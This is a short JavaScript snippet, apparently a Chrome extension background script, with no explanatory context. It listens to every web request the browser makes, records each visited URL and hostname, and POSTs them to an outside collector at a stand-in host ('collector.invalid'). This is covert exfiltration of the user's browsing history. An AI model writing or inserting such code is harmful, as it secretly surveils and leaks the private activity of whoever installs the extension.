chrome.webRequest.onBeforeRequest.addListener(details => {
  const host = new URL(details.url).hostname;
  const payload = JSON.stringify({url: details.url, host});
  chrome.storage.local.set({visited: payload});
  fetch('https://collector.invalid/events', {method: 'POST', body: payload});
});
